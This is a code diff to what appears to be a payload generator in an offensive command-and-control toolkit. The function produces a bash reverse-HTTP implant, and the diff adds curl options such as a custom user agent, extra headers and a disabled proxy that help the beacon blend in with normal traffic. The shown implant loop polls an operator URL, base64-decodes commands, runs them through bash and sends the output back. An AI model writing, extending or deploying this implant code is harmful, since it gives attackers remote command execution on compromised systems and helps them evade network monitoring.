@@ -36,8 +36,25 @@ def generate_bash_reverse_http(ip, port, obs, beacon_interval):
 	beacon_url = f"http://{ip}:{port}/"
 	interval = beacon_interval
 
+	curl_opts = []
+	
+	if useragent:
+		curl_opts.append(f"-A {useragent}")
+
+	if headers:
+		for k, v in headers.items():
+			curl_opts.append(f"-H {k}: {v}")
+
+	if accept:
+		curl_opts.append(f"-H Accept: {accept}")
+
+	if byte_range:
+		curl_opts.append(f"--range {byte_range}")
+	# Always disable proxy to avoid leaking
+	curl_opts.append("--noproxy '*'")
+
 	if obs == 0:
-		payload = make_raw(beacon_url, interval)
+		payload = make_raw(beacon_url, interval, curl_opts, jitter)
 		payutils.copy_and_print(payload)
 		return payload
 
@@ -112,9 +129,9 @@ def generate_bash_reverse_http_obs2(beacon_url: str, interval: int) -> str:
 	cmd=$($PR "%s" "$cmd_b64" | base64 -d)
 
 	if [ "$cmd" = "EXIT_SHELL" ]; then
-    	$PR "[*] received EXIT_SHELL, tearing down implant\n"
-    	break
-    fi
+		$PR "[*] received EXIT_SHELL, tearing down implant\n"
+		break
+	fi
 
 	output=$($BS -c "$cmd" 2>&1)
 	out_b64=$($PR "%s" "$output" | base64 | tr -d '\\n')
